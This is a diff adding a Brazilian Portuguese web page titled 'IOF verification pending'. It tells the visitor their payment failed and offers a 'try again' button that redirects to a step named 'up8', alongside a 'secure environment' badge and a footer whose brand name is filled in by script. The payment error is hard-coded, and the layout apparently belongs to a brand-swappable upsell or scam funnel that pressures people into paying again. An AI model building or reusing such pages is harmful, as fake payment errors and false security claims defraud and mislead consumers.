@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação pendente IOF</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../assets/style.css">
+    <script src="../ups/assets/js/links.js"></script>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@1.7.0/dist/lottie-player.js"></script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo-container">
+                <img src="../assets/logo.png" alt="Logo" class="img-fluid w-50 img-branca">
+            </div>
+        </div>
+    </nav>
+
+
+    <!--BOX VIDEO, timeline...-->
+    <div class="card border border-secondary shadow p-4 my-4 mx-3 mx-md-4">
+
+        <!-- Lottie Animation -->
+        <div class="lottie-container justify-content-center align-items-center">
+            <lottie-player class="img-fluid w-50" src="https://assets10.lottiefiles.com/packages/lf20_jcikwtux.json" background="transparent" speed="1" loop autoplay></lottie-player>
+        </div>
+      
+        <div class="justify-content-center align-items-center mb-4">
+            <h4 class="alert-danger mb-4" style="color:#e74c3c"><strong>Erro no Pagamento</strong></h4>
+            <p>
+                Infelizmente, não conseguimos processar seu pagamento.
+                <br>
+                Isso pode ter ocorrido por algum erro na transação ou na sua conexão.
+            </p>
+
+            <p style="color:#e74c3c">Para continuar, tente realizar o pagamento novamente.</p>
+        </div>
+
+
+        <button class="btn btn-primary w-100 mb-3" onclick="redirect('up8')">
+            Tentar Novamente
+        </button>
+        
+
+        <div class="d-flex align-items-center justify-content-center gap-2 text-muted small mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 256 256">
+            <path fill="#3db1a5" d="M216 56v56c0 96-88 120-88 120s-88-24-88-120V56a8 8 0 0 1 8-8h160a8 8 0 0 1 8 8" opacity=".2"/>
+            <path fill="#3db1a5" d="M208 40H48a16 16 0 0 0-16 16v56c0 52.72 25.52 84.67 46.93 102.19c23.06 18.86 46 25.26 47 25.53a8 8 0 0 0 4.2 0c1-.27 23.91-6.67 47-25.53C198.48 196.67 224 164.72 224 112V56a16 16 0 0 0-16-16m0 72c0 37.07-13.66 67.16-40.6 89.42a129.3 129.3 0 0 1-39.4 22.2a128.3 128.3 0 0 1-38.92-21.81C61.82 179.51 48 149.3 48 112V56h160Zm-70.34-18.34a8 8 0 0 0-11.32 0L120 148.69l-10.34-10.35a8 8 0 0 0-11.32 11.32l16 16a8 8 0 0 0 11.32 0l56-56a8 8 0 0 0-11.32-11.32Z"/>
+        </svg>
+        Ambiente seguro
+        </div>
+
+
+
+    </div>
+    <!-- /conteudo do container do video-->
+
+
+
+
+    <!--FOOTER-->
+    <footer class="footer py-3 mt-4 border-top">
+    <div class="container">
+        <div class="row justify-content-center text-center text-md-start">
+        <div class="col-12 col-md-8">
+            <p class="mb-2">
+            © <span id="currentYear"></span> <span class="marca" style="text-transform: uppercase;"></span> S.A.<br>CNPJ: 60.779.196/0001-96<br>
+            <small class="d-block mt-2">
+                Avenida Presidente Wilson, 9<br>
+                São Vicente/SP - CEP 11320-905
+            </small>
+            </p>
+        </div>
+        </div>
+    </div>
+    </footer>
+    
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+</body>
+</html>
